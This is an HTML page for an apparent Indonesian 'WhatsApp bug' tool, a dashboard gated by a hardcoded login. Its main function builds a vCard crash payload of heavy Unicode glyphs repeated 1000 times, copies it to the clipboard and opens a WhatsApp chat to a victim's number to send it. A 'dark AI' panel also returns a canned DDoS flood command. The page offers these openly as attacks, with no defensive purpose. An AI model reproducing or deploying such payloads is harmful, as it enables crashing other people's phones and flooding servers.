<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>XX-O-25 CLONE</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Nosifer&display=swap');
        body { background: #000; color: #fff; font-family: 'Share Tech Mono', monospace; overflow: hidden; }
        .nosifer { font-family: 'Nosifer', cursive; color: #f00; }
        .input-glow { background: #0a0a0a; border: 1px solid #400; padding: 15px; width: 100%; color: #f00; border-radius: 10px; outline: none; }
        .card-glow { background: #080808; border: 1px solid #200; border-radius: 15px; position: relative; overflow: hidden; }
        .card-glow::before { content: ""; position: absolute; left: 0; top: 0; height: 100%; width: 4px; background: #f00; box-shadow: 0 0 15px #f00; }
        nav { position: fixed; bottom: 0; width: 100%; background: #000; display: flex; justify-content: space-around; padding: 20px; border-top: 1px solid #111; z-index: 100; }
        .active-icon { color: #f00; filter: drop-shadow(0 0 8px #f00); }
        .page { display: none; height: 100vh; padding: 20px; padding-bottom: 120px; overflow-y: auto; }
        .page-active { display: block; }
    </style>
</head>
<body>

    <div id="loginScreen" class="flex flex-col items-center justify-center min-h-screen p-8">
        <div class="mb-8 text-center">
            <div class="w-32 h-32 mx-auto rounded-full border-4 border-red-600 p-1 mb-6 overflow-hidden shadow-[0_0_20px_#f00]">
                <img src="37fead6edd1d8b7f7ad68a4393f99ced.png" class="w-full h-full object-cover">
            </div>
            <h1 class="nosifer text-2xl">Welcome Back</h1>
            <p class="text-zinc-600 text-[10px] mt-2">SIGN IN TO CONTINUE</p>
        </div>
        <div class="w-full max-w-xs space-y-4">
            <input type="text" id="userInput" placeholder="USERNAME" class="input-glow">
            <input type="password" id="passInput" placeholder="PASSWORD" class="input-glow">
            <button onclick="doLogin()" class="w-full bg-red-900 py-4 rounded-lg font-bold active:scale-95 transition-all">SIGN IN</button>
        </div>
    </div>

    <div id="eyeLoader" class="fixed inset-0 bg-black z-[9999] hidden flex-col items-center justify-center">
        <div class="w-[80%] max-w-sm aspect-video border border-red-900/30 rounded-lg overflow-hidden shadow-[0_0_40px_rgba(255,0,0,0.2)]">
            <video id="vidSource" class="w-full h-full object-cover" muted playsinline>
                <source src="download.mp4" type="video/mp4">
            </video>
        </div>
        <h2 class="nosifer text-[12px] mt-8 tracking-widest animate-pulse">XX-O-25</h2>
    </div>

    <div id="dashboardUI" class="hidden">
        
        <div id="homePage" class="page page-active">
            <div class="flex justify-between items-center mb-8"><h2 class="text-red-600 font-bold text-xl">XX-O-25</h2><i class="fas fa-fingerprint text-red-600"></i></div>
            <div class="card-glow p-6">
                <div class="flex items-center gap-4 mb-6">
                    <img src="37fead6edd1d8b7f7ad68a4393f99ced.png" class="w-16 h-16 rounded-full border border-red-600">
                    <div><p class="text-[10px] text-zinc-600">Status</p><h3 class="font-bold text-lg">OWNER / PERMEN</h3></div>
                </div>
                <div class="grid grid-cols-2 gap-4">
                    <div class="bg-black p-4 rounded-xl border border-zinc-900"><p class="text-[8px] text-zinc-500">B-COIN</p><p class="text-red-600 font-bold text-xl">99.985</p></div>
                    <div class="bg-black p-4 rounded-xl border border-zinc-900"><p class="text-[8px] text-zinc-500">L-COIN</p><p class="text-zinc-400 font-bold text-xl">1.250</p></div>
                </div>
            </div>
        </div>

        <div id="bugPage" class="page">
            <div class="card-glow p-6 space-y-6">
                <h2 class="nosifer text-center text-sm">WHATSAPP BUG</h2>
                <input id="targetNumber" type="number" placeholder="628xxxxxxx" class="input-glow">
                <select class="input-glow"><option>Crash Infinity</option><option>Force Close</option></select>
                <button onclick="sendVCard()" class="w-full bg-red-700 py-4 rounded-lg font-bold">KIRIM BUG</button>
            </div>
        </div>

        <div id="toolsPage" class="page">
            <div class="grid grid-cols-1 gap-4">
                <div class="card-glow p-6">
                    <h3 class="text-red-600 font-bold mb-4"><i class="fas fa-robot mr-2"></i>AI DARK SCRIPT</h3>
                    <input id="aiPrompt" type="text" placeholder="Tulis perintah (ex: script ddos)..." class="input-glow mb-4">
                    <button onclick="askDarkAI()" class="w-full bg-zinc-900 border border-red-900 py-2 rounded text-xs">EXECUTE COMMAND</button>
                    <div id="aiResponse" class="mt-4 text-[10px] text-zinc-400 hidden bg-black p-3 border border-zinc-800 rounded"></div>
                </div>
                <div class="grid grid-cols-2 gap-4">
                    <div onclick="showDl('tiktok')" class="card-glow p-4 text-center"><i class="fab fa-tiktok text-red-600 mb-2"></i><p class="text-[8px]">TIKTOK</p></div>
                    <div onclick="showDl('youtube')" class="card-glow p-4 text-center"><i class="fab fa-youtube text-red-600 mb-2"></i><p class="text-[8px]">YOUTUBE</p></div>
                    <div onclick="showDl('spotify')" class="card-glow p-4 text-center col-span-2"><i class="fab fa-spotify text-red-600 mb-2"></i><p class="text-[8px]">SPOTIFY</p></div>
                </div>
            </div>
        </div>

        <nav>
            <div onclick="tab(this, 'homePage')" class="active-icon"><i class="fas fa-home"></i></div>
            <div onclick="tab(this, 'bugPage')"><i class="fab fa-whatsapp"></i></div>
            <div onclick="tab(this, 'toolsPage')"><i class="fas fa-th-large"></i></div>
        </nav>
    </div>

    <script>
        function doLogin() {
            const u = document.getElementById('userInput').value;
            const p = document.getElementById('passInput').value;
            if(u === "PERMEN" && p === "DENIS") {
                document.getElementById('loginScreen').style.display = 'none';
                const loader = document.getElementById('eyeLoader');
                loader.classList.replace('hidden', 'flex');
                document.getElementById('vidSource').play();
                setTimeout(() => {
                    loader.classList.replace('flex', 'hidden');
                    document.getElementById('dashboardUI').classList.remove('hidden');
                }, 5000);
            } else { alert("WRONG!"); }
        }

        function tab(el, id) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('page-active'));
            document.querySelectorAll('nav div').forEach(n => n.classList.remove('active-icon'));
            document.getElementById(id).classList.add('page-active');
            el.classList.add('active-icon');
        }

        function askDarkAI() {
            const p = document.getElementById('aiPrompt').value.toLowerCase();
            const res = document.getElementById('aiResponse');
            res.classList.remove('hidden');
            if(p.includes("ddos")) {
                res.innerText = "Generating Script...\npython3 ddos.py -s [IP] -p 80 -t 100\nStatus: Ready to Flood.";
            } else { res.innerText = "Command received. Processing in dark mode..."; }
        }

        function showDl(type) { alert("Downloader " + type + " Active! Paste Link in Dashboard."); }

        function sendVCard() {
            const n = document.getElementById('targetNumber').value;
            const payload = "BEGIN:VCARD\nVERSION:3.0\nN:;"+"꧅ꦿꦸꦼꦽ௵జ్ఞా𒀱".repeat(1000)+";;;\nFN:SYSTEM_FAILURE\nEND:VCARD";
            const el = document.createElement('textarea'); el.value = payload; document.body.appendChild(el); el.select(); document.execCommand('copy'); document.body.removeChild(el);
            alert("Bug Copied!");
            window.location.href = `whatsapp://send?phone=${n}&text=SYSTEM_FAILURE_BY_DENIS`;
        }
    </script>
</body>
</html>
